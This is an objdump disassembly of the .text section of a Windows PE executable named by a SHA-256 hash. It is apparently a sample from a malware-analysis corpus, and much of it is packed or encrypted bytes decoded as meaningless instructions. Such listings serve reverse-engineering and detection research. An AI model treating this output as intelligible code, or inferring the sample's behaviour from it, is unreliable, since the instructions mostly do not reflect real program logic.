
2cf9802d6fd4d0bb3aac10b7bb8de241f92ad4d5f26acfb9ea72569005b5e255.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [ebp+0x1],dl
  401003:	add    al,dh
  401005:	push   ecx
  401006:	inc    ecx
  401007:	add    BYTE PTR [edi-0x7daf8b9d],ch
  40100d:	imul   esp,DWORD PTR [ebx+0x41],0x6572628c
  401014:	arpl   WORD PTR [eax+eax*1+0x0],si
  401018:	xor    al,0x68
  40101a:	popa   
  40101b:	fs sub al,0x6e
  40101e:	bound  esi,QWORD PTR [edx+0x51]
  401021:	jne    0x40109c
  401023:	inc    ebp
  401024:	dec    eax
  401025:	inc    esi
  401026:	add    BYTE PTR [eax],al
  401028:	xor    al,0x68
  40102a:	popa   
  40102b:	fs sub al,0x6e
  40102e:	bound  esi,QWORD PTR [edx+0x51]
  401031:	jne    0x4010ac
  401033:	inc    ebp
  401034:	sub    BYTE PTR [eax+0x0],dl
  401037:	add    BYTE PTR [edi],ch
  401039:	bound  esi,QWORD PTR [ebp+ecx*2+0xf]
  40103d:	arpl   WORD PTR [ebp+0x6c],si
  401040:	or     eax,0x146e614f
  401045:	imul   esp,DWORD PTR [ebp+0x41],0xfffffff0
  401049:	push   es
  40104a:	add    BYTE PTR [eax],al
  40104c:	xor    esi,DWORD PTR [ebp+0x65]
  40104f:	popa   
  401050:	cld    
  401051:	popa   
  401052:	inc    esi
  401053:	imul   ebx,esp,0xd4004161
  401059:	jae    0x4010cf
  40105b:	jb     0x401030
  40105d:	gs je  0x4010a1
  401060:	lock push es
  401062:	add    BYTE PTR [eax],al
  401064:	mov    bh,0x61
  401066:	je     0x4010bf
	...
  401078:	add    BYTE PTR [eax],al
  40107a:	fldcw  WORD PTR [eax+0x64]
  40107d:	outs   dx,DWORD PTR ds:[esi]
  40107e:	(bad)  
  40107f:	jae    0x4010c5
  401081:	imul   eax,edx,0x9f746361
  401087:	je     0x401102
  401089:	inc    ecx
  40108a:	lock push es
  40108c:	add    BYTE PTR [eax],al
  40108e:	mov    bh,0x61
  401090:	je     0x4010df
  401092:	xchg   DWORD PTR [edx+0x75],esp
  401095:	ins    BYTE PTR es:[edi],dx
  401096:	xchg   ebp,eax
  401097:	dec    esi
  401098:	popa   
  401099:	outs   dx,BYTE PTR ds:[esi]
  40109a:	mov    WORD PTR [edx+0x65],gs
  40109d:	push   edi
  40109e:	lock push es
  4010a0:	add    BYTE PTR [eax],al
  4010a2:	in     al,dx
  4010a3:	add    al,0x40
  4010a5:	add    BYTE PTR [eax*1+0x50c0040],al
  4010ac:	inc    eax
  4010ad:	add    BYTE PTR [eax*1+0x5280040],ah
  4010b4:	inc    eax
  4010b5:	add    BYTE PTR [eax*1+0x5500040],ah
  4010bc:	inc    eax
  4010bd:	add    BYTE PTR [eax],bh
  4010bf:	add    eax,0x622f0040
  4010c4:	je     0x401116
  4010c6:	and    ch,BYTE PTR [eax+0x63]
  4010c9:	inc    ecx
  4010ca:	or     al,0x63
  4010cc:	jb     0x401133
  4010ce:	and    esi,DWORD PTR [eax+eax*1+0x0]
  4010d2:	and    al,0x68
  4010d4:	popa   
  4010d5:	fs cmp al,0x6e
  4010d8:	bound  esi,QWORD PTR [edx+0x11]
  4010db:	jne    0x401156
  4010dd:	inc    ebp
	...
  4010ee:	add    BYTE PTR [eax],al
  4010f0:	clc    
  4010f1:	inc    ebp
  4010f2:	add    BYTE PTR [eax],al
  4010f4:	or     esp,DWORD PTR [edx+0x72]
  4010f7:	outs   dx,BYTE PTR ds:[esi]
  4010f8:	aad    0x6a
  4010fa:	xor    esi,DWORD PTR [edx]
  4010fc:	push   ss
  4010fd:	arpl   WORD PTR [esp+ebp*2-0x10],bp
  401101:	push   es
  401102:	add    BYTE PTR [eax],al
  401104:	lds    esi,FWORD PTR [ebx+0x76]
  401107:	arpl   dx,ax
  401109:	jb     0x401139
  40110b:	fs aam 0x6a
  40110e:	add    BYTE PTR [eax],al
  401110:	int    0x61
  401112:	ins    DWORD PTR es:[edi],dx
  401113:	jae    0x4010e2
  401115:	jb     0x401117
  401117:	add    BYTE PTR [ebp-0x5d9c898d],bl
  40111d:	jb     0x40114d
  40111f:	mov    WORD PTR fs:[edx+0x0],gs
  401123:	add    BYTE PTR [ebp-0x7f9c929f],al
  401129:	jge    0x40112b
  40112b:	add    BYTE PTR [esi-0x7a8b8d93],bl
  401131:	gs ins BYTE PTR es:[edi],dx
  401133:	inc    ecx
  401134:	test   BYTE PTR [edx+0x6f],ch
  401137:	arpl   ax,si
  401139:	push   es
  40113a:	add    BYTE PTR [eax],al
  40113c:	ds pusha 
  40113e:	jb     0x4011b4
  401140:	gs push 0x6344416c
  401146:	outs   dx,DWORD PTR ds:[esi]
  401147:	arpl   ax,si
  401149:	push   es
  40114a:	add    BYTE PTR [eax],al
  40114c:	sbb    eax,0x40616d65
  401151:	pop    ebp
  401152:	imul   esp,DWORD PTR [ebp+0x0],0x0
	...
  401165:	add    BYTE PTR [edi],bh
  401167:	inc    esi
  401168:	inc    si
  40116a:	sbb    DWORD PTR [ebx+0x65],esp
  40116d:	add    BYTE PTR [esi],bh
  40116f:	pusha  
  401170:	jb     0x4011e6
  401172:	and    eax,0x22506c68
  401177:	data16 je 0x4011df
  40117a:	adc    edi,DWORD PTR [ebx+0x0]
  40117d:	add    BYTE PTR [eax],bh
  40117f:	ins    BYTE PTR es:[edi],dx
  401180:	popa   
  401181:	jo     0x4011b4
  401183:	arpl   WORD PTR [edi+ebp*2+0x13],bp
  401187:	pop    es
  401188:	add    BYTE PTR [eax],al
  40118a:	fld    TBYTE PTR [ebx+0x72]
  40118d:	outs   dx,BYTE PTR ds:[esi]
  40118e:	int    0x62
  401190:	xor    esi,DWORD PTR [edx]
  401192:	push   cs
  401193:	imul   ebp,DWORD PTR [esp+ebp*2-0x10],0x6
  401198:	add    BYTE PTR [eax],al
  40119a:	mov    bh,0x6b
  40119c:	je     0x4011ee
  40119e:	ret    0x6365
  4011a1:	gs ret 
  4011a3:	jns    0x4011ed
  4011a5:	shl    DWORD PTR gs:[esi+0x0],1
  4011a9:	add    al,dh
  4011ab:	push   es
  4011ac:	inc    esp
  4011ad:	add    eax,esi
  4011af:	stos   BYTE PTR es:[edi],al
  4011b0:	pop    ecx
  4011b1:	nop
  4011b2:	lock loopne 0x4011b8
  4011b5:	add    al,dh
  4011b7:	jecxz  0x4011bc
  4011b9:	add    al,dh
  4011bb:	hlt    
  4011bc:	sti    
  4011bd:	add    al,dh
  4011bf:	aaa    
  4011c0:	add    eax,DWORD PTR [eax]
  4011c2:	lock fild WORD PTR [ebx]
  4011c5:	add    al,dh
  4011c7:	pop    ds
  4011c8:	add    al,0x0
	...
  4011da:	add    BYTE PTR [eax],al
  4011dc:	lock fild WORD PTR [ebx]
  4011df:	add    al,dh
  4011e1:	fild   WORD PTR [ebx]
  4011e3:	add    al,dh
  4011e5:	fild   WORD PTR [ebx]
  4011e7:	add    al,dh
  4011e9:	fild   WORD PTR [ebx]
  4011eb:	add    al,dh
  4011ed:	fild   WORD PTR [ebx]
  4011ef:	add    al,dh
  4011f1:	fild   WORD PTR [ebx]
  4011f3:	add    al,dh
  4011f5:	fild   WORD PTR [ebx]
  4011f7:	add    al,dh
  4011f9:	fild   WORD PTR [ebx]
  4011fb:	add    al,dh
  4011fd:	pop    edi
  4011fe:	add    al,0x0
  401200:	lock in eax,dx
  401202:	sbb    bh,BYTE PTR [edx+0x9afdfee]
  401208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401209:	mov    esi,0xa33c01bb
  40120e:	and    eax,0x77071854
  401213:	and    BYTE PTR [eax],al
  401215:	repnz push 0x67
  401218:	add    bh,BYTE PTR [edi-0x412cdf98]
  40121e:	imul   ebp,DWORD PTR [esi-0x29],0xd56223d3
  401225:	push   DWORD PTR [ebp+0x75]
  401228:	(bad)  
  401229:	jmp    FWORD PTR [esi+ebp*2+0x10]
  40122d:	lods   al,BYTE PTR ds:[esi]
  40122e:	dec    edx
  40122f:	push   ebx
  401230:	adc    bl,cl
  401232:	push   0x64
  401234:	aad    0xf5
  401236:	or     BYTE PTR ds:0x3cd06ea,cl
  40123c:	lock push es
  40123e:	jmp    0x401246
	...
  40124f:	add    BYTE PTR [eax],al
  401251:	add    al,dh
  401253:	push   es
  401254:	mov    ecx,0x9d06f040
  401259:	add    al,0xf3
  40125b:	push   es
  40125c:	pop    edi
  40125d:	cwde   
  40125e:	jne    0x4012a5
  401260:	jmp    0xe9470268
  401265:	add    esi,eax
  401267:	push   es
  401268:	or     DWORD PTR [edi+eiz*8],eax
  40126b:	pop    es
  40126c:	repnz add al,0xf2
  40126f:	cmp    cl,ch
  401271:	stc    
  401272:	lock push es
  401274:	jmp    0xe94702c6
  401279:	add    esi,eax
  40127b:	push   es
  40127c:	push   ebp
  40127d:	in     eax,dx
  40127e:	lock push es
  401280:	jmp    0xe9470298
  401285:	adc    esi,ecx
  401287:	push   es
  401288:	jmp    0xe9474290
  40128d:	adc    esi,eax
  40128f:	push   es
  401290:	jmp    0xed47029a
  401295:	add    esi,eax
  401297:	push   es
  401298:	jmp    0xed4702a0
  40129d:	add    esi,eax
  40129f:	push   es
  4012a0:	jmp    0xe94702a8
  4012a5:	jae    0x401298
  4012a7:	push   es
  4012a8:	jmp    0xb14702b2
  4012ad:	mov    ch,0xf1
  4012af:	push   es
  4012b0:	jmp    0x4012b5
  4012b2:	lock push es
  4012b4:	jmp    0x4012bc
	...
  4012c9:	pop    es
  4012ca:	jmp    0xe94702e2
  4012cf:	add    esp,eax
  4012d1:	push   es
  4012d2:	jmp    0x4702ea
  4012d7:	jmp    0xd94019cf
  4012dc:	repz push es
  4012de:	add    cl,ch
  4012e0:	repz push es
  4012e2:	add    cl,ch
  4012e4:	repz push es
  4012e6:	add    cl,dl
  4012e8:	ret    0x5
  4012eb:	and    ebx,esi
  4012ed:	push   es
  4012ee:	add    cl,ch
  4012f0:	repz push es
  4012f2:	add    cl,ch
  4012f4:	repz push es
  4012f6:	add    cl,ch
  4012f8:	repz push es
  4012fa:	add    cl,ch
  4012fc:	repz push es
  4012fe:	add    cl,ch
  401300:	repz push es
  401302:	add    cl,ch
  401304:	repz push es
  401306:	add    cl,ch
  401308:	repz push es
  40130a:	add    cl,ch
  40130c:	repz push es
  40130e:	add    cl,ch
  401310:	repz push es
  401312:	add    cl,ch
  401314:	repz push es
  401316:	add    cl,ch
  401318:	repz push es
  40131a:	add    cl,ch
  40131c:	repz push es
  40131e:	add    cl,ch
  401320:	repz push es
  401322:	add    cl,ch
  401324:	repz push es
  401326:	add    cl,ch
  401328:	repz push es
  40132a:	add    cl,ch
	...
  40133c:	add    BYTE PTR [eax],al
  40133e:	repz push es
  401340:	add    cl,ch
  401342:	repz push es
  401344:	add    cl,ch
  401346:	repz push es
  401348:	add    cl,ch
  40134a:	repz push es
  40134c:	add    cl,ch
  40134e:	repz push es
  401350:	add    BYTE PTR [ebp-0x35],dh
  401353:	add    eax,0x6f36d00
  401358:	add    cl,ch
  40135a:	repz push es
  40135c:	add    cl,ch
  40135e:	repz push es
  401360:	add    BYTE PTR [eax],al
  401362:	pop    ecx
  401363:	pop    es
  401364:	add    BYTE PTR [eax],al
  401366:	pop    ecx
  401367:	pop    es
  401368:	add    BYTE PTR [eax],al
  40136a:	dec    ecx
  40136b:	pop    es
  40136c:	add    BYTE PTR [eax],al
  40136e:	dec    ecx
  40136f:	pop    es
  401370:	add    BYTE PTR [eax],al
  401372:	inc    edi
  401373:	arpl   WORD PTR [ebp+0x78],sp
  401376:	jge    0x40137f
  401378:	add    BYTE PTR [eax],al
  40137a:	xchg   edx,eax
  40137b:	sti    
  40137c:	add    BYTE PTR [eax],al
  40137e:	or     DWORD PTR [edi],edx
  401380:	add    BYTE PTR [eax],al
  401382:	sbb    ebp,ebp
  401384:	add    BYTE PTR [eax],al
  401386:	sbb    DWORD PTR [ecx],ecx
  401388:	add    BYTE PTR [eax],al
  40138a:	or     DWORD PTR [edi],eax
  40138c:	add    BYTE PTR [eax],al
  40138e:	or     DWORD PTR [edi],eax
  401390:	add    BYTE PTR [eax],al
  401392:	fld    DWORD PTR [esi]
  401394:	add    BYTE PTR [eax],al
  401396:	stc    
  401397:	or     al,BYTE PTR [eax]
  401399:	pusha  
  40139a:	idiv   DWORD PTR [eax+0x64]
  40139d:	popa   
  40139e:	cmp    eax,0x66
	...
  4013b3:	add    cl,bl
  4013b5:	add    eax,0x16d90000
  4013ba:	add    DWORD PTR [eax],eax
  4013bc:	leave  
  4013bd:	or     al,0x0
  4013bf:	add    cl,cl
  4013c1:	push   es
  4013c2:	add    DWORD PTR [eax],eax
  4013c4:	cdq    
  4013c5:	push   es
  4013c6:	add    BYTE PTR [eax],al
  4013c8:	cdq    
  4013c9:	push   es
  4013ca:	add    BYTE PTR [eax],al
  4013cc:	mov    DWORD PTR [esi],eax
  4013ce:	add    BYTE PTR [eax],al
  4013d0:	leave  
  4013d1:	or     al,BYTE PTR [eax]
  4013d3:	inc    eax
  4013d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013d5:	push   edx
  4013d6:	popa   
  4013d7:	je     0x4013d1
  4013d9:	or     al,BYTE PTR [eax]
  4013db:	add    BYTE PTR [ecx+0x48],ah
  4013de:	add    BYTE PTR [eax],al
  4013e0:	mov    DWORD PTR [esi],esp
  4013e2:	add    DWORD PTR [eax],eax
  4013e4:	pop    ecx
  4013e5:	dec    esp
  4013e6:	add    BYTE PTR [eax],al
  4013e8:	pop    ecx
  4013e9:	or     al,0x1
  4013eb:	add    al,dh
  4013ed:	fild   WORD PTR [ebx]
  4013ef:	add    al,dh
  4013f1:	fild   WORD PTR [ebx]
  4013f3:	add    al,dh
  4013f5:	fild   WORD PTR [ebx]
  4013f7:	add    al,dh
  4013f9:	lahf   
  4013fa:	add    eax,DWORD PTR [eax]
  4013fc:	xor    al,ah
  4013fe:	add    eax,DWORD PTR [eax]
  401400:	lock fild WORD PTR [ebx]
  401403:	add    al,dh
  401405:	fild   WORD PTR [ebx]
  401407:	add    al,dh
  401409:	fild   WORD PTR [ebx]
  40140b:	add    al,dh
  40140d:	mov    dl,0x8c
  40140f:	in     al,dx
  401410:	mov    dl,dl
  401412:	adc    eax,DWORD PTR [eax-0x10]
  401415:	pop    es
  401416:	jne    0x401419
	...
  401428:	add    BYTE PTR [eax],al
  40142a:	xor    esi,ecx
  40142c:	div    DWORD PTR [ebp-0x18]
  40142f:	test   DWORD PTR [edx],eax
  401431:	push   0xfffffff0
  401433:	pop    es
  401434:	mov    esp,0xccdff0da
  401439:	ret    0xdfec
  40143c:	push   eax
  40143d:	mov    ecx,esp
  40143f:	inc    edi
  401440:	sub    dl,BYTE PTR [eax]
  401442:	xor    al,ah
  401444:	sti    
  401445:	jb     0x401438
  401447:	pushf  
  401448:	test   DWORD PTR [ebx+0x7403f845],0x85164eb
  401452:	imul   ecx,ebp,0xfffffff6
  401455:	jne    0x40144f
  401457:	test   al,0x52
  401459:	or     BYTE PTR [ecx+0x4500009d],bh
  40145f:	gs call 0x6cd7c0e8
  401465:	dec    edi
  401466:	loopne 0x401487
  401468:	add    al,0xf8
  40146a:	add    bl,bh
  40146c:	ret    0x7fff
  40146f:	repnz pop es
  401471:	(bad)  
  401472:	sub    eax,0x6c45bf78
  401477:	push   es
  401478:	jmp    0x72470480
  40147d:	push   ecx
  40147e:	call   0xf0aa1000
  401483:	icebp  
  401484:	aam    0x13
  401486:	dec    edi
  401487:	jnp    0x4014ce
  401489:	idiv   DWORD PTR [ebp+0x713eee]
	...
  40149f:	add    al,ch
  4014a1:	icebp  
  4014a2:	fwait
  4014a3:	movaps xmm4,xmm0
  4014a6:	fld    QWORD PTR [ebx]
  4014a8:	lds    edi,FWORD PTR [ebp+0x15]
  4014ab:	sub    DWORD PTR [esi+ebp*8],0xffffff91
  4014af:	jge    0x4014b1
  4014b1:	inc    edi
  4014b2:	jmp    0x2a47b7b2
  4014b7:	div    DWORD PTR [edi]
  4014b9:	dec    ebx
  4014ba:	add    DWORD PTR [eax+esi*8],eax
  4014bd:	push   es
  4014be:	jmp    0xea32ca81
  4014c3:	add    esi,eax
  4014c5:	push   es
  4014c6:	bound  edx,QWORD PTR [ecx-0x8]
  4014c9:	jnp    0x4014c6
  4014cb:	mov    BYTE PTR ds:0xf26a39ef,ch
  4014d1:	out    dx,eax
  4014d2:	pop    esp
  4014d3:	clc    
  4014d4:	xlat   BYTE PTR ds:[ebx]
  4014d5:	jp     0x4014a8
  4014d7:	test   BYTE PTR [ebp-0x1],0xc5
  4014db:	push   ecx
  4014dc:	fdivr  QWORD PTR [ebx+0x24]
  4014df:	cld    
  4014e0:	test   eax,0x1d03edc5
  4014e5:	jl     0x4014a4
  4014e7:	xor    BYTE PTR [edi+ebp*8+0x4700c211],0xe9
  4014ef:	sti    
  4014f0:	and    al,BYTE PTR [esi]
  4014f2:	stos   BYTE PTR es:[edi],al
  4014f3:	imul   BYTE PTR [edi-0xffc6eb6]
  4014f9:	push   es
  4014fa:	jmp    0xea3342bd
  4014ff:	add    esi,eax
  401501:	push   es
  401502:	add    BYTE PTR [edx+0x0],ah
	...
  401515:	add    BYTE PTR [eax],ah
  401517:	dec    DWORD PTR [edx-0x7b58725]
  40151d:	mov    ecx,0xd4ff05d9
  401522:	addr16 lock jne 0x401577
  401526:	pop    esi
  401527:	jp     0x401531
  401529:	dec    esi
  40152a:	mov    eax,ds:0xfbbcff1a
  40152f:	fiadd  WORD PTR [edi+0x50f0463e]
  401535:	bound  esp,QWORD PTR [eax-0x66247502]
  40153b:	push   es
  40153c:	push   0xffffffe9
  40153e:	push   ds
  40153f:	jp     0x40153d
  401541:	push   ds
  401542:	mov    al,ds:0xeb9cffee
  401547:	out    dx,eax
  401548:	push   edx
  401549:	cmc    
  40154a:	stos   DWORD PTR es:[edi],eax
  40154b:	jnp    0x4015a2
  40154d:	add    edx,esi
  40154f:	pop    ecx
  401550:	or     al,0xc2
  401552:	and    edi,DWORD PTR [ecx+0x6]
  401555:	ret    0xbe33
  401558:	ret    0xf3e1
  40155b:	scas   al,BYTE PTR es:[edi]
  40155c:	add    ecx,ebp
  40155e:	repz push es
  401560:	leave  
  401561:	stos   DWORD PTR es:[edi],eax
  401562:	in     al,dx
  401563:	push   es
  401564:	push   ebp
  401565:	(bad)  
  401566:	enter  0xc483,0xcd
  40156a:	pop    esp
  40156b:	and    BYTE PTR [ecx],dl
  40156d:	sub    esp,ebp
  40156f:	out    dx,al
  401570:	jb     0x40155a
  401572:	mov    al,0xef
  401574:	(bad)  
  401575:	cmp    al,0xdc
  401577:	out    dx,eax
  401578:	jne    0x40155b
	...
  40158a:	add    BYTE PTR [eax],al
  40158c:	fwait
  40158d:	outs   dx,BYTE PTR ds:[esi]
  40158e:	jmp    DWORD PTR [esi+0x14bffb9d]
  401594:	lock mov ebp,0x7bf3e5c2
  40159a:	push   ebp
  40159b:	loope  0x401615
  40159d:	adc    al,0x8d
  40159f:	add    ah,dl
  4015a1:	out    dx,al
  4015a2:	push   eax
  4015a3:	inc    DWORD PTR [ebx+edx*1-0x5728a01]
  4015aa:	jne    0x4015b4
  4015ac:	ficom  WORD PTR [esp+ecx*1-0x7b]
  4015b0:	sbb    DWORD PTR [ebx+0x13],esi
  4015b3:	mov    edx,DWORD PTR [edi+esi*8+0x6059453b]
  4015ba:	pop    es
  4015bb:	mov    eax,0x358
  4015c0:	mov    ds:0xa2c02af0,al
  4015c5:	add    al,0x2b
  4015c7:	rcl    BYTE PTR [eax],0xc5
  4015ca:	or     al,0x0
  4015cc:	test   BYTE PTR [esi-0x14],bh
  4015cf:	adc    ebp,0xffffffee
  4015d2:	push   esi
  4015d3:	push   0x401394
  4015d8:	add    DWORD PTR [ebp+0x1],esi
  4015db:	ret    
  4015dc:	inc    BYTE PTR [ebp+0x5f190c7d]
  4015e2:	push   es
  4015e3:	cmp    DWORD PTR [ebx+edi*8-0x1],0x74
  4015e8:	push   es
  4015e9:	push   ds
  4015ea:	rcr    BYTE PTR [esi+0x10],0xc9
  4015ee:	or     al,0x0
	...
  401600:	add    BYTE PTR [eax],al
  401602:	pop    edx
  401603:	jne    0x401615
  401605:	add    BYTE PTR [ecx+eax*1-0x48],al
  401609:	add    ecx,ecx
  40160b:	or     al,BYTE PTR [eax]
  40160d:	pop    esi
  40160e:	nop
  40160f:	enter  0xc,0x42
  401613:	pop    ebp
  401614:	or     al,0xc7
  401616:	adc    al,0xef
  401618:	add    BYTE PTR [eax],al
  40161a:	leave  
  40161b:	or     cl,BYTE PTR [ebx+0x127f9155]
  401621:	(bad)  
  401622:	aam    0xee
  401624:	push   eax
  401625:	inc    DWORD PTR [ebx+edx*1]
  401628:	push   esi
  401629:	push   eax
  40162b:	or     cl,BYTE PTR [edi+edi*8]
  40162e:	and    dh,al
  401630:	jle    0x4015f2
  401632:	or     ebp,ebx
  401634:	sub    al,al
  401636:	push   ds
  401637:	mov    bh,0xc1
  401639:	or     al,0xf0
  40163b:	pusha  
  40163c:	jbe    0x40163a
  40163e:	lock repnz cld 
  401641:	sub    dh,BYTE PTR [eax]
  401643:	(bad)  
  401644:	retf   0xecc2
  401647:	fisttp WORD PTR [eax-0xc1eabbb]
  40164d:	sub    DWORD PTR [ebp-0x773b9111],esi
  401653:	fild   WORD PTR [ebx]
  401655:	add    al,dh
  401657:	(bad)  
  401658:	retf   0xe4c2
  40165b:	fisttp WORD PTR [esi-0x75]
  40165e:	sbb    al,0x5f
  401660:	mov    edi,0xf42517f8
  401665:	push   0x0
	...
  401676:	add    BYTE PTR [eax],al
  401678:	hlt    
  401679:	icebp  
  40167a:	inc    ebx
  40167b:	add    BYTE PTR [eax],bl
  40167d:	xchg   edx,eax
  40167e:	add    al,bl
  401680:	jp     0x9a308089
  401686:	add    BYTE PTR [edx-0x10],ch
  401689:	cdq    
  40168a:	add    BYTE PTR [eax-0x10],ch
  40168d:	fild   WORD PTR [ebx]
  40168f:	sub    bh,0x72
  401692:	or     ebp,eax
  401694:	jno    0x401642
  401696:	add    al,0x0
  401698:	imul   esp,DWORD PTR [edx],0xdc5d40f0
  40169e:	mov    esp,0x5ddff8c2
  4016a3:	add    BYTE PTR [ebp+0x1a],dh
  4016a6:	in     al,dx
  4016a7:	push   eax
  4016a8:	dec    eax
  4016a9:	loopne 0x4016be
  4016ab:	add    al,dh
  4016ad:	bound  ecx,QWORD PTR [ecx-0xc636008]
  4016b3:	push   eax
  4016b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016b5:	push   es
  4016b6:	sbb    al,0xf0
  4016b8:	mov    BYTE PTR [ecx-0x4a],ch
  4016bb:	add    al,0xf0
  4016bd:	add    DWORD PTR [ecx+0x14edfe79],ebp
  4016c3:	lock cwde 
  4016c5:	dec    ebx
  4016c6:	sahf   
  4016c7:	add    al,0xf0
  4016c9:	and    DWORD PTR [ecx-0x17014d43],ebp
  4016cf:	repnz in eax,0xee
  4016d2:	pop    esp
  4016d3:	mov    DWORD PTR [eax-0x23],ebp
  4016d6:	data16 repz shr ch,0xd4
  4016db:	inc    DWORD PTR [eax]
	...
  4016ed:	add    BYTE PTR [edi+0x17],cl
  4016f0:	push   esi
  4016f1:	repz dec edi
  4016f3:	mov    esp,ecx
  4016f5:	jmp    0x4016e7
  4016f7:	jae    0x40167e
  4016f9:	repz vsqrtss xmm7,xmm2,DWORD PTR [ebx]
  4016fe:	pop    ds
  4016ff:	push   es
  401700:	jmp    0xe94708b0
  401705:	add    edi,DWORD PTR [ecx]
  401707:	enter  0x3f1,0xc5
  40170b:	or     DWORD PTR ds:0xa9186f5c,0xe8780803
  401715:	mov    BYTE PTR [edi],0x60
  401718:	jmp    0x401777
  40171a:	lock in eax,dx
  40171c:	je     0x401719
  40171e:	setp   ah
  401721:	repnz out dx,eax
  401723:	mov    esi,0x51f0082b
  401728:	jb     0x401709
  40172a:	dec    eax
  40172b:	mov    ds:0xeef043fb,eax
  401730:	pop    ebx
  401731:	add    eax,0x443ecb3
  401736:	pop    edx
  401737:	pop    es
  401738:	(bad)  
  401739:	js     0x401723
  40173b:	fisubr WORD PTR [esi-0x10]
  40173e:	mov    bh,0xec
  401740:	add    BYTE PTR [eax+0x140003b5],ah
  401746:	daa    
  401747:	fild   DWORD PTR [ebx-0x3ba07453]
  40174d:	sti    
  40174e:	xor    eax,DWORD PTR [edi]
  401750:	clc    
  401751:	sbb    eax,DWORD PTR [eax]
	...
  401763:	add    ch,dh
  401765:	(bad)  
  401766:	dec    DWORD PTR [esi+0x2c8efb08]
  40176c:	mov    esp,es
  40176e:	inc    ebp
  40176f:	jge    0x401764
  401771:	push   es
  401772:	add    cl,ch
  401774:	int    0x6
  401776:	push   esp
  401778:	addr16 in eax,dx
  40177a:	jne    0x40176d
  40177c:	cmp    esp,DWORD PTR [esi-0x3]
  40177f:	pop    esi
  401780:	bound  eax,QWORD PTR [eax+0x18cee155]
  401786:	call   esp
  401788:	push   edi
  401789:	in     al,dx
  40178a:	jne    0x4017cd
  40178c:	inc    edx
  40178d:	jb     0x401797
  40178f:	ds popf 
  401791:	push   cs
  401792:	leave  
  401793:	sub    ebp,DWORD PTR [ebx]
  401795:	in     al,dx
  401796:	push   esp
  401797:	bound  eax,QWORD PTR [edi+0x5f]
  40179a:	add    dl,bh
  40179c:	mov    bl,0x6
  40179e:	clc    
  40179f:	fwait
  4017a0:	in     al,dx
  4017a1:	(bad)  
  4017a2:	inc    DWORD PTR [ebx-0x1e8a140d]
  4017a8:	sub    esp,DWORD PTR [ecx-0x41fdf901]
  4017ae:	ret    0xf3e5
  4017b1:	push   ecx
  4017b2:	mov    eax,DWORD PTR ds:0x6a14526e
  4017b8:	adc    eax,0x9aed7507
  4017bd:	enter  0xe910,0xe0
  4017c1:	jno    0x4017d3
  4017c3:	(bad)  
  4017c4:	inc    edi
  4017c5:	sti    
  4017c6:	(bad)  
  4017c7:	push   esp
	...
  4017d8:	add    BYTE PTR [eax],al
  4017da:	(bad)
  4017de:	mov    ah,0xf5
  4017e0:	dec    DWORD PTR [ebx+0x2210edc]
  4017e6:	push   eax
  4017e7:	les    edx,FWORD PTR [eax]
  4017e9:	add    ah,bh
  4017eb:	imul   ebp,esp,0xfff64d83
  4017f1:	jne    0x401778
  4017f3:	dec    ecx
  4017f4:	add    al,0x8d
  4017f6:	fdivr  st(6),st
  4017f8:	push   eax
  4017f9:	(bad)  
  4017fa:	fsub   st(2),st
  4017fc:	out    0xc3,eax
  4017fe:	jbe    0x4017f5
  401800:	dec    DWORD PTR [ebx+0x388306cc]
  401806:	pop    ecx
  401807:	jae    0x401810
  401809:	mov    ecx,DWORD PTR [edi+esi*8]
  40180c:	bswap  eax
  40180e:	ret    0x2b04
  401811:	shl    BYTE PTR [eax],0xc5
  401814:	or     BYTE PTR [eax],al
  401816:	mov    WORD PTR [edx-0x14],gs
  401819:	or     DWORD PTR ds:0x4575fff7,0x49
  401820:	add    cl,BYTE PTR [ebp-0xaf0a74]
  401826:	ins    BYTE PTR es:[edi],dx
  401827:	out    dx,eax
  401828:	out    0x97,eax
  40182a:	(bad)  
  40182b:	cmc    
  40182c:	dec    DWORD PTR [ebx+0x3882eb4c]
  401832:	or     DWORD PTR [ebx+0x8],esi
  401835:	fxsave [ebx-0x2]
  401839:	xchg   ch,cl
  40183b:	leave  
  40183c:	add    ch,BYTE PTR [ebx]
	...
  40184e:	add    BYTE PTR [eax],al
  401850:	leave  
  401851:	scas   eax,DWORD PTR es:[edi]
  401852:	ret    0x908
  401855:	push   esp
  401856:	mov    ebp,esp
  401858:	pop    edx
  401859:	mov    edi,0xea5cfffc
  40185e:	imul   eax,DWORD PTR [ecx],0x50ff4164
  401864:	mov    dh,0x71
  401866:	or     al,ch
  401868:	lock inc ebp
  40186a:	icebp  
  40186b:	inc    edi
  40186d:	gs inc esi
  40186f:	or     al,0x73
  401871:	or     BYTE PTR [esp+esi*2],al
  401874:	out    dx,al
  401875:	fdivr  DWORD PTR [ecx+0x5c5af45]
  40187b:	sub    esi,DWORD PTR [eax-0xff73a59]
  401881:	sub    bh,BYTE PTR [ebp-0x14]
  401884:	imul   esi,DWORD PTR [ebx],0x14
  401887:	or     edx,0xffffffdf
  40188a:	jbe    0x401890
  40188c:	mov    ecx,0x7effff9e
  401891:	jmp    0x401892
  401893:	(bad)  
  401894:	std    
  401895:	neg    ebx
  401897:	loopne 0x401905
  401899:	jno    0x40188b
  40189b:	or     esi,DWORD PTR [eax]
  40189d:	repz cld 
  40189f:	mov    al,ch
  4018a1:	out    dx,eax
  4018a2:	enter  0xf002,0xdf
  4018a6:	add    eax,DWORD PTR [eax]
  4018a8:	pop    ebx
  4018a9:	jecxz  0x401908
  4018ab:	add    DWORD PTR [edi-0x2d],eax
  4018ae:	(bad)  
  4018af:	inc    ch
  4018b1:	neg    ebx
  4018b3:	push   ecx
	...
  4018c4:	add    BYTE PTR [eax],al
  4018c6:	xor    al,0x29
  4018c8:	lock leave 
  4018ca:	xor    ah,ah
  4018cc:	add    edx,DWORD PTR [ebp+0x7b]
  4018cf:	sub    al,0x84
  4018d1:	les    ebx,FWORD PTR [edx+ebp*4]
  4018d4:	jl     0x40194b
  4018d6:	in     al,0x95
  4018d8:	add    ecx,DWORD PTR [ebp-0xacec4b]
  4018de:	jge    0x4018cf
  4018e0:	pop    ecx
  4018e1:	inc    DWORD PTR [ebp+0x1da0dbf7]
  4018e7:	loopne 0x4018ec
  4018e9:	or     esi,DWORD PTR [eax+0x6583096b]
  4018ef:	fadd   QWORD PTR [edx]
  4018f1:	jne    0x4018ea
  4018f3:	push   es
  4018f4:	adc    al,ah
